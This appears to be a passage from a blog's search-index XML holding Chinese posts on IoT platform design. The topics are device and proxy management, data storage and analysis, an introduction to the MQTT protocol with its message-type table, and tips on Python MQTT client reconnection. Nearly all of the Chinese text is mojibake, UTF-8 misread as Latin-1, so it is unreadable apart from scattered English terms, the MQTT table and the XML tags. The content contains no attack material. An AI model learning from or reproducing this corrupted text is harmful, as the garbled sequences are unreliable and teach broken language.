æ”¹æŸ¥ è®¾å¤‡ç®¡ç† è®¾å¤‡åˆ›å»º: å¿…é¡»å‚æ•°å‚æ•°: è®¾å¤‡åç§°, æŽ¥å…¥æ–¹å¼(é€šè¿‡agentæŽ¥å…¥è¿˜æ˜¯é€šè¿‡proxyæŽ¥å…¥), è®¾å¤‡ç±»åž‹(å…ˆå®šä¹‰ç±»åž‹) å¯é€‰å‚æ•°: åœ°ç†ä½ç½®, è®¾å¤‡æ ‡ç­¾, å…¶ä»–å±žæ€§,çœŸæ­£åˆ›å»ºæ—¶æˆ‘ä»¬éœ€è¦è€ƒè™‘: é…é¢æ£€æŸ¥(é™åˆ¶ä¸€ä¸ªç”¨æˆ·å¯ä»¥åˆ›å»ºçš„è®¾å¤‡æ•°) å¦‚æžœé€šè¿‡agentæŽ¥å…¥, ä¸ºagenté¢å‘è®¾å¤‡æŽ¥å…¥è¯ä¹¦å’Œç§é’¥ ç”ŸæˆæŽ¥å…¥äº‘ç«¯çš„ç”¨æˆ·å’Œå¯†ç  é…ç½®è®¾å¤‡å’Œäº‘ç«¯é€šä¿¡çš„é€šé“ äº‘ç«¯è®¢é˜…è¿™äº›é€šé“, ç­‰å¾…æ•°æ®ä¸ŠæŠ¥æˆ–è€…æ¥è‡ªagentçš„è¯·æ±‚ æŸ¥çœ‹è®¾å¤‡:è®¾å¤‡åˆ›å»ºæˆåŠŸè¿‡åŽç”¨æˆ·å¯ä»¥æŸ¥çœ‹åˆ°: è®¾å¤‡çš„åŸºæœ¬ä¿¡æ¯, æ¯”å¦‚åç§°, ID, æŽ¥å…¥æ–¹å¼, åœ°ç†ä½ç½®, åˆ›å»ºæ—¶é—´ è®¾å¤‡æ ‡ç­¾ä¿¡æ¯, è¿™æ˜¯ç®€å•çš„èµ„äº§, ç”¨äºŽé€šè¿‡æ ‡ç­¾åˆ†ç±»è®¾å¤‡, ç®€å•çš„èµ„äº§åˆ†ç±»ç®¡ç† è®¾å¤‡é€šé“ä¿¡æ¯, æ•°æ®ä¸ŠæŠ¥é€šé“å’Œè®¾å¤‡æŽ§åˆ¶é€šé“çš„åç§° æŽ¥å…¥ä¿¡æ¯, æŽ¥å…¥äº‘ç«¯çš„ç”¨æˆ·åå’Œå¯†ç  è®¾å¤‡çŠ¶æ€ä¿¡æ¯, è®¾å¤‡æ˜¯å¦ä¸‹çº¿, èƒ½å¦å’Œè®¾å¤‡é€šä¿¡ agentçŠ¶æ€ä¿¡æ¯, agentæ˜¯å¦è¿è¡Œ å¦‚æžœæ˜¯é€šè¿‡proxyæŽ¥å…¥, æ˜¾ç¤ºproxyåç§°å’ŒçŠ¶æ€ä¿¡æ¯ ä¿®æ”¹è®¾å¤‡: æä¾›è®¾å¤‡åŸºæœ¬ä¿¡æ¯çš„ä¿®æ”¹: è®¾å¤‡åç§°, æŽ¥å…¥æ–¹å¼, åœ°ç†ä½ç½®, ä»¥åŠå…¶ä»–ç”¨æˆ·è‡ªå®šä¹‰å±žæ€§çš„ä¿®æ”¹ ç¦ç”¨è®¾å¤‡: ç¦ç”¨è®¾å¤‡åŽ, å°†ç¦æ­¢è®¾å¤‡ä¸Žäº‘ç«¯å»ºç«‹è¿žæŽ¥: å¦‚æžœæ˜¯agentæŽ¥å…¥, å‰”é™¤è¯¥agentçš„å›žè¯, å¹¶ç¦æ­¢è¯¥è®¾å¤‡ ä¸Žäº‘ç«¯å»ºç«‹è¿žæŽ¥ å¦‚æžœæ˜¯proxyæŽ¥å…¥, é€šçŸ¥proxy, åœæ­¢ä¸ºè¯¥è®¾å¤‡å»ºç«‹ä¸Žäº‘ç«¯çš„è¿žæŽ¥ å¯ç”¨è®¾å¤‡: å¯ç”¨è®¾å¤‡åŽ, æ¢å¤å…è®¸è®¾å¤‡ä¸Žäº‘ç«¯å»ºç«‹è¿žæŽ¥: å¦‚æžœæ˜¯agentæŽ¥å…¥, æ’¤é”€è®¾å¤‡ç¦æ­¢æŽ¥å…¥äº‘ç«¯çš„æŽ§åˆ¶ å¦‚æžœæ˜¯proxyæŽ¥å…¥, é€šçŸ¥proxy, é‡æ–°ä¸ºè¯¥è®¾å¤‡å»ºç«‹ä¸Žäº‘ç«¯çš„è¿žæŽ¥ åˆ é™¤è®¾å¤‡: åˆ é™¤è®¾å¤‡åŽ, ä¸Žè®¾å¤‡ç›¸å…³çš„æ‰€æœ‰è¿žæŽ¥éƒ½å°†æ–­å¼€, è¯¥è®¾å¤‡ä»Žæ­¤ä»¥åŽå°†æ— æ³•ä¸Žäº‘ç«¯å»ºç«‹è¿žæŽ¥ å–æ¶ˆè¯¥è®¾å¤‡é€šé“çš„æ‰€æœ‰å¤„ç† æ¸…é™¤æŽ¥å…¥ç”¨æˆ·ä¿¡æ¯, ç”¨æˆ·æ— æ³•å’Œäº‘ç«¯å»ºç«‹è¿žæŽ¥ å¦‚æžœæ˜¯proxyæŽ¥å…¥, é€šçŸ¥ä»£ç† è¯¥è®¾å¤‡å·²ç»åˆ é™¤, æ›´æ–°ä»£ç†åˆ—è¡¨, åœæ­¢ä¸ºè¯¥è®¾å¤‡ä»£ç† æ¸…é™¤è®¾å¤‡ç›¸å…³å…ƒæ•°æ® è®¾å¤‡é…é¢ç®¡ç†: é™åˆ¶ç”¨æˆ·å¯ä»¥åˆ›å»ºçš„è®¾å¤‡æ•°é‡ æŸ¥è¯¢é…ç½®: ä¿®æ”¹é…é¢: ç”±ç®¡ç†å‘˜ä¿®æ”¹é…é¢ è®¾å¤‡æ ‡ç­¾ç®¡ç†: åŸºäºŽæ ‡ç­¾çš„èµ„äº§ç®¡ç† æ ‡ç­¾çš„åˆ›å»º,æŸ¥çœ‹,ä¿®æ”¹,åˆ é™¤ ä¸ºè®¾å¤‡æ·»åŠ æ ‡ç­¾ ç§»é™¤è®¾å¤‡çš„æ ‡ç­¾ è®¾å¤‡çŠ¶æ€å½±å­: æŸ¥çœ‹è®¾å¤‡æœ€æ–°çŠ¶æ€, è®¾å¤‡æ•°æ®æŽ¥å…¥äº‘ç«¯æ—¶éœ€è¦é€šè¿‡ è®¾å¤‡ç±»åž‹ æ£€æŸ¥è®¾å¤‡çš„ä¸ŠæŠ¥çš„æ•°æ®æ˜¯å¦åˆæ³•, å¹¶ä¸”ç»æœ€æ–°çŠ¶æ€ å½•å…¥, ç”¨æˆ·å¯ä»¥çœ‹åˆ°è¯¥è®¾å¤‡çš„ æœ€æ–°çŠ¶æ€æ•°æ®. è®¾å¤‡çš„åå‘æŽ§åˆ¶: æŽ§åˆ¶æŒ‡ä»¤æŸ¥çœ‹æŽ§åˆ¶æŒ‡ä»¤ç”±agentçš„æŽ§åˆ¶å™¨å®žçŽ°, åœ¨agentå¯åŠ¨æ—¶ä¸ŠæŠ¥ç»™äº‘ç«¯: æŽ§åˆ¶æŒ‡ä»¤çš„åŸºæœ¬ä¿¡æ¯: æŽ§åˆ¶æŒ‡ä»¤çš„åç§°, åŠŸèƒ½è¯´æ˜Ž, ä½¿ç”¨æ–¹å¼, é¢„æœŸç»“æžœ, å¼‚å¸¸è¯´æ˜Žã€‚ æŽ§åˆ¶æŒ‡ä»¤çš„ä¸ŠæŠ¥æ—¶é—´, æ‰§è¡Œæƒä½¿ç”¨è€…åˆ—è¡¨ æŽ§åˆ¶æŒ‡ä»¤çš„æ‰§è¡Œè®°å½• æ‰§è¡Œæƒåˆ†é…å°†æŽ§åˆ¶æŒ‡ä»¤çš„æ‰§è¡Œæƒåˆ†é…ç»™æœ‰ä¸ªç”¨æˆ·, è¯¥ç”¨æˆ·å¯ä»¥æ‰§è¡Œè¯¥æŽ§åˆ¶æŒ‡ä»¤ æ‰§è¡Œæƒå›žæ”¶å°†æŽ§åˆ¶æŒ‡ä»¤çš„æ‰§è¡Œæƒå›žæ”¶ã€‚ç”¨æˆ·å°†æ²¡æœ‰æ”¹æŒ‡ä»¤çš„æ‰§è¡Œæƒ æ‰§è¡ŒæŽ§åˆ¶æŒ‡ä»¤é»˜è®¤ä»…æœ‰ç®¡ç†å‘˜å¯ä»¥æ‰§è¡ŒæŽ§åˆ¶æŒ‡ä»¤, æ‰§è¡ŒæŽ§åˆ¶æŒ‡ä»¤, å¾—åˆ°æ‰§è¡Œç»“æžœ ç¦ç”¨æŽ§åˆ¶æŒ‡ä»¤ ç”±ç®¡ç†å‘˜å†³å®šæ˜¯å¦ç¦ç”¨è¯¥æŽ§åˆ¶æŒ‡ä»¤ å¯ç”¨æŽ§åˆ¶æŒ‡ä»¤ç”±ç®¡ç†å‘˜å†³å®šæ˜¯å¦å¯ç”¨è¯¥æŽ§åˆ¶æŒ‡ä»¤ proxyç®¡ç†: åˆ›å»ºä»£ç†: å¿…é¡»å‚æ•°: ä»£ç†åç§°, å¯é€‰å‚æ•°: åœ°ç†ä½ç½®, å…¶ä»–åˆ›å»ºå±žæ€§ æŸ¥çœ‹ä»£ç†: åç§°, åœ°ç†ä½ç½®, å…¶ä»–å±žæ€§, åˆ›å»ºæ—¶é—´ ä»£ç†çŠ¶æ€: æœªæŽ¥å…¥, è¿è¡Œä¸­, ç¦ç”¨ ä»£ç†çš„ æ•°å­—ç­¾åè¯ä¹¦, CAè¯ä¹¦, ä»£ç†ç§é’¥ ä»£ç†è‡ªå·±ä½¿ç”¨çš„æŽ§åˆ¶é€šé“(ä»£ç†å’Œäº‘ç«¯é€šä¿¡çš„æŽ¥å£), å’Œå¼‚å¸¸ä¸ŠæŠ¥é€šé“ ä¿®æ”¹ä»£ç†:åç§°, åœ°ç†ä½ç½®, å…¶ä»–å±žæ€§ åˆ é™¤ä»£ç†: ç¡®è®¤è¯¥ä»£ç†ä¸‹é¢æ²¡æœ‰è®¾å¤‡åŽæ–¹å¯ä»¥åˆ é™¤, ç§»é™¤åŽçš„è®¾å¤‡å±žäºŽæ— ä¸ŠæŠ¥æ–¹å¼çš„è®¾å¤‡, åŠé”€ä»£ç†çš„è¯ä¹¦ å‰”é™¤ä»£ç† çš„ä¸ŠæŠ¥å›žè¯(éžå¸¸å±é™©, å¦‚æžœä»£ç†æ­£åœ¨ä¸ŠæŠ¥æ•°æ®) æ¸…é™¤ä»£ç†ä¿¡æ¯ ç¦ç”¨ä»£ç†: ç¦æ­¢è¯¥ä»£ç†å‘å¸ƒæ•°æ®åˆ°äº‘ç«¯(çš„æ•°æ®ç®¡é“) å¯ç”¨ä»£ç†: ç¦æ­¢è¯¥ä»£ç†å‘å¸ƒæ•°æ®åˆ°äº‘ç«¯(çš„æ•°æ®ç®¡é“) æŸ¥çœ‹ä»£ç†ä¸‹çš„è®¾å¤‡: åˆ—å‡ºè¯¥ä»£ç†ä¸‹é¢çš„è®¾å¤‡åˆ—è¡¨ æ·»åŠ è®¾å¤‡åˆ°è¯¥ä»£ç†ä¸‹é¢ ç§»é™¤è¯¥ä»£ç†ä¸‹é¢çš„è®¾å¤‡ device-gatewayåŽå°åŠŸèƒ½æ¦‚è¿°: æ•°æ®å­˜å‚¨è´Ÿè´£å°†æ•°æ®å­˜å‚¨åˆ°åŽç«¯å­˜å‚¨ çŠ¶æ€æ•°æ®å­˜å‚¨ çƒ­æ•°æ®å­˜å‚¨ åŽ†å²æ•°æ®å­˜å‚¨ æ•°æ®å¯è§†åŒ–ä¸Žè¿è¥(data-manager)ä¸»è¦è´Ÿè´£æ•°æ®çš„ç®¡ç†å’ŒæŸ¥çœ‹, æ•°æ®ä»¥ç±»åž‹ç»„ç»‡åœ¨ä¸€èµ·, ä»¥ç‚¹ä½ä¸ºæ ¸å¿ƒ, ç”¨æˆ·é€šè¿‡ä¸ºè¿™äº› æ•°æ®æ·»åŠ æ ‡ç­¾ æ¥æ·»åŠ  æ•°æ®ç»´åº¦, æ–¹ä¾¿ä¸šåŠ¡ä½¿ç”¨ã€‚ æ•°æ®åˆ†ç±»æä¾›æ•°æ®çš„æŸ¥çœ‹ä¸Žè¿è¥ç®¡ç†, æ•°æ®ä»¥æŒ‡æ ‡çš„æ–¹å¼å­˜å‚¨, ç”¨æˆ·é€šè¿‡æ ‡ç­¾æ¥è¿è¥æ•°æ®ã€‚è¿è¥çš„æ•°æ®ä¸»è¦ç”±2ç±»æž„æˆ: ç‰©ç†æŒ‡æ ‡æ•°æ®: é‡‡é›†ä¸Šæ¥çš„åŽŸå§‹æ•°æ®, ä»¥ç‚¹ä½çš„æœ€å°é€»è¾‘å•å…ƒä¸ºæŒ‡æ ‡,æ¯”å¦‚ é½¿è½®ç®±ç­‰ã€‚ åˆ†æžè¿‡åŽçš„æŒ‡æ ‡æ•°æ®: ç»è¿‡åˆ†æžè¿‡åŽçš„æ•°æ® ä»¥ç®—æ³•ä¸ºæŒ‡æ ‡, åˆ†æžæ ¹æ®éœ€è¦ä¸ºè¿™äº›æ•°æ®æ‰“ç®—æ ‡ç­¾ã€‚(æ¯”å¦‚æ‰“ç®—è®¾å¤‡æ ‡ç­¾) æ•°æ®æŸ¥çœ‹æä¾›å¯¹æ•°æ®çš„åŸºæœ¬å±•çŽ°çš„æ”¯æŒ, ä½†ä¸æä¾›å¤§é‡åŽŸå§‹æ•°æ®çš„å¯¼å‡ºåŠŸèƒ½, å¤§é‡åŽŸå§‹æ•°æ®æ˜¯ç•™ç»™è®¡ç®—å¹³å°ä½¿ç”¨çš„, å¦‚éœ€å¯¼å‡ºè¯·ä½¿ç”¨å¯¼å‡ºå·¥å…·è¿›è¡Œå¯¼å‡ºã€‚ æ•°æ®æŸ¥è¯¢é…ç½®æŸ¥çœ‹:  åŽ†å²æ•°æ®åˆ†å±‚é…ç½®: 1. æŒ‰æ—¶é—´ä¸ºç»´åº¦è¿›è¡Œåˆ’åˆ†, é»˜è®¤ä¸º3ä¸ªæœˆ 2. æŒ‰å®¹é‡è¿›è¡Œåˆ’åˆ†, é»˜è®¤ä¸ºæœ€è¿‘1wæ¡æ•°æ®, é»˜è®¤æŒ‰è§„åˆ™1æ‰§è¡Œã€‚ çŠ¶æ€æ•°æ®æŸ¥è¯¢å®¹é‡é™åˆ¶: é»˜è®¤ä¸º1000æ¡æ•°æ®, åŠè®¾å¤‡ç‚¹ä½ä¸å¾—é»˜è®¤ä¸å¾—è¶…è¿‡1000 åŽ†å²æ•°æ®æŸ¥è¯¢å®¹é‡é™åˆ¶: é»˜è®¤ä¸º100 * 100æ¡æ•°æ®, åŠè®¾å¤‡ç‚¹ä½ä¸èƒ½è¶…è¿‡100ä¸ªï¼Œæ¯ä¸ªç‚¹ä½çš„æ•°æ®ä¸å¾—è¶…è¿‡100æ¡ æ•°æ®æŸ¥è¯¢é…ç½®ä¿®æ”¹: ä¿®æ”¹ä»¥ä¸Šé‚£äº›é»˜è®¤é…ç½® æŸ¥è¯¢æ•°æ®: çŠ¶æ€æŸ¥è¯¢: ä¹Ÿå°±æ˜¯å½“å‰æŽ¥å…¥äº‹ä»¶çš„æŸ¥è¯¢(ç”¨äºŽæŸ¥çœ‹å½“ä¸‹æŽ¥å…¥çš„æ•°æ®, ä¸èƒ½æŸ¥çœ‹åŽ†å²æ•°æ®), å¦‚æžœè®¾å¤‡æŽ¥å…¥å¼‚å¸¸ è¯·æ˜¾ç¤ºæŽ¥å…¥å¼‚å¸¸ä¿¡æ¯, ä»¥websocket è¿›è¡Œå®žæ—¶æä¾› åŽ†å²æŸ¥è¯¢: ä¹Ÿå°±æ˜¯è¶‹åŠ¿æŸ¥è¯¢ çƒ­æ•°æ®æŸ¥è¯¢: å¦‚æžœæ•°æ®é‡è¿‡å¤§ï¼Œéœ€è¦åˆ†ç»„è¿›è¡Œèšåˆ å†·æ•°æ®æŸ¥è¯¢: å¦‚æžœæ•°æ®é‡è¿‡å¤§ï¼Œéœ€è¦åˆ†ç»„è¿›è¡Œèšåˆ æ•°æ®æ ‡ç­¾ç®¡ç† æ•°æ®æ ‡ç­¾æŸ¥è¯¢, é»˜è®¤æ ‡ç­¾å±žäºŽç³»ç»Ÿæ ‡ç­¾(æ¯”å¦‚æ•°æ®å±žäºŽé‚£å°è®¾å¤‡, æ•°æ®æ˜¯ç”±é‚£ä¸ªé‡‡é›†å™¨é‡‡é›†ä¸Šæ¥çš„), ç¦æ­¢ä¿®æ”¹, ä¸ºåªè¯»çŠ¶æ€, å…¶ä»–æ˜¯ç”¨æˆ·ä¸ºæ•°æ® è¿›è¡Œçš„è‡ªå®šä¹‰æ ‡ç­¾ æ·»åŠ æ ‡ç­¾: ä¸ºæ•°æ® æ·»åŠ æ ‡ç­¾ï¼Œ æ ‡ç­¾æœ‰é•¿åº¦é™åˆ¶(æœ€é•¿ä¸å¾—è¶…è¿‡16ä¸ªå­—ç¬¦) åˆ é™¤æ ‡ç­¾: åˆ é™¤æ ‡ç­¾,ä½†æ˜¯åˆ é™¤ä¹‹å‰ éœ€è¦ç¡®è®¤æ•°æ®æ˜¯å¦å·²ç»æŽˆæƒ, å¦‚æžœå·²ç»æŽˆæƒåˆ†äº«, éœ€è¦æ’¤é”€åˆ†äº« æ‰èƒ½åˆ é™¤ æ•°æ®æŽˆæƒ ç”¨æˆ·æŒ‰ç…§è‡ªå·±çš„éœ€è¦ å°†æ•°æ®æ‰“ä¸Šæ ‡ç­¾, æˆ–è€…ä½¿ç”¨é»˜è®¤æ ‡ç­¾, å°†å¯¹åº”çš„æ•°æ® åˆ†æžç»™å…¶ä»–ç”¨æˆ·è®¿é—®. æ•°æ®åˆ†äº«æŸ¥è¯¢: æŸ¥è¯¢é‚£äº›æ•°æ®,è¢«åˆ†æžç»™äº†é‚£äº›ç”¨æˆ· åˆ†äº«æƒé™æ’¤é”€: æ’¤é”€å·²ç»åˆ†æžå‡ºåŽ»çš„æ•°æ®æŽˆæƒ æ•°æ®åˆ†äº«: æŒ‡å®šæŸäº›ç”¨æˆ·å¯ä»¥è®¿é—®é‚£äº›æ ‡ç­¾çš„æ•°æ®ã€‚ æ•°æ®åˆ†æžæ•°æ®åˆ†æžå›´ç»•ç®—æ³•å’Œä»»åŠ¡è¿›è¡Œå±•å¼€, å…³é”®çš„åœ¨äºŽ ç®—æ³•çš„é«˜åº¦å¯å®šåˆ¶åŒ–, ç®—æ³•æµ‹è¯•, è¿è¡Œæ—¶æ£€æŸ¥, ä»¥åŠç®—æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­ä»»åŠ¡çš„å¯è§†åŒ–ã€‚åŠŸèƒ½æ˜¯æ»¡è¶³é«˜çº§ç”¨æˆ· å¯¹äºŽæ•°æ®åˆ†æžçš„éœ€æ±‚ã€‚ é€šè¿‡ç®—æ³•å¯¹æ•°æ®è¿›è¡Œæ·±åº¦åˆ†æžçš„åŠŸèƒ½ã€‚ å®žæ—¶è®¡ç®— ç¦»çº¿è®¡ç®—(æŠ¥è¡¨ç»Ÿè®¡å’Œæ·±åº¦å­¦ä¹ , æ·±åº¦éœ€è¦ä¾èµ–å¤§é‡æ•°æ®è®­ç»ƒå‡ºæ¨¡åž‹ï¼Œç„¶åŽé€šè¿‡æ¨¡åž‹ åº”ç”¨åˆ°äº‹ä»¶åˆ†æž, è¾¾åˆ°æ™ºèƒ½åˆ†æžçš„ç›®çš„) æ··åˆè®¡ç®—: æ¯”å¦‚å…ˆä½¿ç”¨ç¦»çº¿è®¡ç®—è®­ç»ƒæ¨¡åž‹, ç„¶åŽå°†æ¨¡åž‹ åº”ç”¨åˆ°å®žæ—¶è®¡ç®—, æˆ–è€…ä½¿ç”¨å®žæ—¶è®¡ç®—ä½œä¸ºæµ‹è¯•æ•°æ®,ä»¥åŽ†å²æ•°æ®ä½œä¸ºè®­ç»ƒæ•°æ® è¿›è¡Œäº¤å‰éªŒè¯,ä»¥ä¾¿è®­ç»ƒå‡†ç¡®çš„æ¨¡åž‹ã€‚ ç®—æ³•ç®¡ç®¡ç†ç®—æ³•æ–‡ä»¶, ç®—æ³•æ–‡ä»¶è¡¨çŽ°ä¸ºä¸€ä¸ªè„šæœ¬æ–‡ä»¶, å¯¹äºŽstorm å¹³å°è€Œå·², ç®—æ³•æ–‡ä»¶æ˜¯grooveè„šæœ¬, å¯¹äºŽspark å¹³å°è€Œè¨€, ç®—æ³•æ–‡ä»¶ å¯ä»¥æ˜¯sparkæ”¯æŒçš„å¤šç§è¯­è¨€çš„è„šæœ¬ã€‚ ä¸Šä¼ ç®—æ³•: ä¸Šä¼ è„šæœ¬æ–‡ä»¶, ç®—æ³•åç§°(é»˜è®¤æ˜¯ç®—æ³•æ–‡ä»¶çš„åç§°,åŽ»æŽ‰åŽç¼€), ç®—æ³•æè¿°ä¿¡æ¯(åŒ…å«ç®—æ³•è¦è§£å†³çš„é—®é¢˜, è¾“å…¥å‚æ•°çš„è§£é‡Šå’Œè¾“å‡ºå‚æ•°çš„è§£é‡Š), ç®—æ³•è¿è¡Œå¹³å°() ä¸‹è½½ç®—æ³•: ä¸‹è½½ç®—æ³•æ–‡ä»¶ã€‚ åˆ é™¤ç®—æ³•: åˆ é™¤ç®—æ³•æ–‡ä»¶. æ›´æ–°ç®—æ³•å…ƒæ•°æ®: æ›´æ–°ç®—æ³•çš„åç§° æˆ–è€…ç®—æ³•çš„æè¿°ä¿¡æ¯ æŸ¥çœ‹ç®—æ³•: æŸ¥çœ‹æ‰€æœ‰ç®—æ³•ã€‚ ç®—æ³•è®¿é—®æŽˆæƒ: æŽˆæƒç®—æ³•ç»™æŸä¸ªç”¨æˆ·è®¿é—®ã€‚ ç®—æ³•æŽˆæƒæ’¤é”€: æ’¤é”€æŸä¸ªç”¨æˆ·è®¿é—®æŸä¸ªç®—æ³•çš„æƒé™ã€‚ ä»»åŠ¡æ‰§è¡Œç®—æ³• è¿è¡Œæ—¶äº§ç”Ÿä¸€ä¸ªçœŸæ­£çš„ä»»åŠ¡, å› æ­¤è¿è¡Œç®—æ³• éœ€è¦æœ‰ä»¥ä¸‹è¿™äº›å‚æ•°: ç®—æ³•æ–‡ä»¶, é€šè¿‡æŒ‡å®šç®—æ³•æ–‡ä»¶çš„idæ¥å®Œæˆ ç®—æ³•çš„è¾“å…¥å’Œè¾“å‡º: æ‰«æèŽ·å–ç®—æ³•æ–‡ä»¶çš„ è¾“å…¥å’Œè¾“å‡ºå½¢å‚() é€‰å®šè¾“å…¥æºçš„å½¢å‚å¯¹åº”çš„æ•°æ®, é€šè¿‡åŽ»è¾“å…¥æº æŸ¥çœ‹å¾—å‡º, é€‰æ‹©è¾“å‡ºæº å¯¹åº”çš„åç§°ã€‚(å¯ä»¥æ£€æŸ¥è¾“å…¥æºæ˜¯å¦æœ‰æ•°æ®) æ‰§è¡Œå¹³å°, æ ¹æ®ç®—æ³•æ–‡ä»¶id, å¾—çŸ¥è¯¥ç®—æ³•è°ƒåº¦åˆ°é‚£ä¸ªå¹³å°ä¸Šè¿è¡Œ(jstrom, spark), å¦‚æžœæ²¡æœ‰å¯¹åº”å¹³å°æ”¯æŒ, åˆ™æŠ¥é”™ çŽ°æœ‰ç‰©è”ç½‘å¹³å°å‚è€ƒå›½å†…å¤–ç‰©è”ç½‘å¹³å°æž¶æž„å¾®è½¯Azure IoTäºšé©¬é€ŠAWS IoTIBM Watson IOT]]></content>
      <tags>
        <tag>iot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç‰©è”ç½‘ä¹‹MQTT]]></title>
    <url>%2F2017%2F07%2F05%2Fmqtt-introduce%2F</url>
    <content type="text"><![CDATA[ç‰©è”ç½‘ç‰©æŽ¥å…¥åè®®MQTT ç›¸å¯¹æ¥è¯´ï¼ŒIoTçš„æŠ€æœ¯æŒ‘æˆ˜ï¼Œä¸»è¦åœ¨å®‰å…¨éšæ‚£ã€è¿žæŽ¥ç®¡ç†ã€æµ·é‡æ•°æ®ç®¡ç†ï¼Œç”¨å…³é”®å­—æ¥è¯´å°±æ˜¯æµ·é‡ã€é€šç”¨ã€å¯æ‰©å±•ã€ç®€å•ã€‚ç‰©æŽ¥å…¥äº‘ç«¯ï¼Œæœ‰å¾ˆå¤šæŒ‘æˆ˜, æ•°æ®çš„å®‰å…¨å°¤ä¸ºé‡è¦ åè®®æ¯”è¾ƒåè®®æ¯”è¾ƒ MQTTç®€ä»‹MQTTæ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯æœåŠ¡ç«¯æž¶æž„çš„å‘å¸ƒ/è®¢é˜…æ¨¡å¼çš„æ¶ˆæ¯ä¼ è¾“åè®®ã€‚å®ƒçš„è®¾è®¡æ€æƒ³æ˜¯è½»å·§ã€å¼€æ”¾ã€ç®€å•ã€è§„èŒƒï¼Œæ˜“äºŽå®žçŽ°ã€‚è¿™äº›ç‰¹ç‚¹ä½¿å¾—å®ƒå¯¹å¾ˆå¤šåœºæ™¯æ¥è¯´éƒ½æ˜¯å¾ˆå¥½çš„é€‰æ‹©ï¼Œç‰¹åˆ«æ˜¯å¯¹äºŽå—é™çš„çŽ¯å¢ƒå¦‚æœºå™¨ä¸Žæœºå™¨çš„é€šä¿¡(M2M)ä»¥åŠç‰©è”ç½‘çŽ¯å¢ƒ(IoT)ã€‚æ€»ä½“æ¥è¯´MQTTæœ‰å¦‚ä¸‹ç‰¹æ€§: è½»é‡çº§çš„ machine-to-machine é€šä¿¡åè®®ã€‚ publish/subscribeæ¨¡å¼ã€‚ åŸºäºŽTCP/IPã€‚ æ”¯æŒQoSã€‚ é€‚åˆäºŽä½Žå¸¦å®½ã€ä¸å¯é è¿žæŽ¥ã€åµŒå…¥å¼è®¾å¤‡ã€CPUå†…å­˜èµ„æºç´§å¼ ã€‚ æ˜¯ä¸€ç§æ¯”è¾ƒä¸é”™çš„Androidæ¶ˆæ¯æŽ¨é€æ–¹æ¡ˆã€‚ FacebookMessengeré‡‡ç”¨äº†MQTTã€‚ MQTTæœ‰å¯èƒ½æˆä¸ºç‰©è”ç½‘çš„é‡è¦åè®® mqttåè®®ç®€ä»‹ åè®®ç®€ä»‹ æŠ¥æ–‡æ ¼å¼bit76543210byte 1Message typeDUPQoS levelRETAINbyte 2Message length (between one and four bytes)byte 3â€¦ if needed to encode message lengthbyte 4â€¦ if needed to encode message lengthbyte 5â€¦ if needed to encode message length æŽ§åˆ¶æŒ‡ä»¤ Message Type Value Description CONNECT 1 Client request to connect to Server CONNACK 2 Connect Acknowledgment PUBLISH 3 Publish message PUBACK 4 Publish Acknowledgment PUBREC 5 Publish Received (assured delivery part 1) PUBREL 6 Publish Release (assured delivery part 2) PUBCOMP 7 Publish Complete (assured delivery part 3) SUBSCRIBE 8 Client Subscribe request SUBACK 9 Subscribe Acknowledgment UNSUBSCRIBE 10 Client Unsubscribe request UNSUBACK 11 Unsubscribe Acknowledgment PINGREQ 12 PING Request PINGRESP 13 PING Response DISCONNECT 14 Client is Disconnecting Qos mqttçš„çŠ¶æ€æœºwo]]></content>
      <tags>
        <tag>iot</tag>
        <tag>mqtt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Pythonçš„mqttå®¢æˆ·ç«¯ä½¿ç”¨è¯´æ˜Ž]]></title>
    <url>%2F2017%2F07%2F04%2Fmqtt-reconnect%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘ä½¿ç”¨Pythonå†™ä¸€ä¸ªåŽå°æœåŠ¡å¤„ç†mqtté‡Œé¢çš„äº‹ä»¶æ—¶é‡åˆ°äº†ä¸€ä¸ªéº»çƒ¦: mqttè¿žæŽ¥é‡ç½®æ—¶(é‡å¯mqttæœåŠ¡åŽ), ä¹‹å‰pubæ¶ˆæ¯çš„çº¿ç¨‹ä¸èƒ½æ­£å¸¸å·¥ä½œäº†, ç»è¿‡å¤šæ¬¡è¸©å‘, ç»ˆäºŽè§£å†³. å¼•å‘é—®é¢˜çš„åŽŸå› æ˜¯æˆ‘ä½¿ç”¨å§¿åŠ¿ä¸å¯¹é€ æˆçš„, ä¸€æ—¦ä½ ä½¿ç”¨å§¿åŠ¿ä¸å¯¹ ä¼šé€ æˆä¸€äº›å¥‡æ€ªçš„é—®é¢˜,å¹¶ä¸”å¾ˆéš¾è§£å†³ã€‚ å› æ­¤è¯·æ­£ç¡®ä½¿ç”¨mqttã€‚ æ³¨æ„äº‹é¡¹å…³äºŽMQTTåè®®çš„ä»‹ç»è¯·å‚è€ƒä¹‹å‰åšå®¢: ç‰©è”ç½‘ä¹‹MQTT, åªæœ‰åœ¨äº†è§£MQTTåè®®è¿‡åŽ, æˆ‘ä»¬æ‰èƒ½ä»¥æ­£ç¡®çš„å§¿åŠ¿ä½¿ç”¨å¥¹, ä»¥ä¸‹æ˜¯æˆ‘è§‰å¾—éœ€è¦æ³¨æ„çš„åœ°æ–¹: æŒ‰éœ€ä½¿ç”¨MQTTçš„Qos, å½“Qos=2æ—¶å¯é æ€§æœ€é«˜, ä½†æ˜¯ä¼šæŸå¤±æ€§èƒ½ã€‚ å°½é‡ä½¿ç”¨client_idæ¥æ ‡ç¤ºå®¢æˆ·ç«¯, ä½†æ˜¯æ³¨æ„ å¦‚æžœ2ä¸ªå®¢æˆ·ç«¯ä½¿ç”¨åŒä¸€ä¸ªclient_id, ä¼šå‡ºçŽ°clientäº‰æŠ¢è¿žæŽ¥çš„çŠ¶æ€, æ‰€ä»¥å…¨å±€æŒæœ‰ä¸€ä¸ªclientæ˜¯ä¸é”™çš„é€‰æ‹©ã€‚ æ³¨æ„å¼‚æ­¥å¤„ç†, åœ¨å›žè°ƒå‡½æ•°ä¸­ä¸èƒ½é˜»å¡žã€‚ å°†æ‰€æœ‰æ•°æ®å¤„ç†é€»è¾‘æ”¾åˆ°å›žè°ƒå‡½æ•°é‡Œé¢, é˜²æ­¢é“¾æŽ¥é‡ç½®æ—¶ï¼Œæ¼æŽ‰å¤„ç†é€» åœ¨on_messageçš„å›žè°ƒé‡Œé¢ å¤„ç†æ‰€æœ‰çš„è®¢é˜…æ¶ˆæ¯ 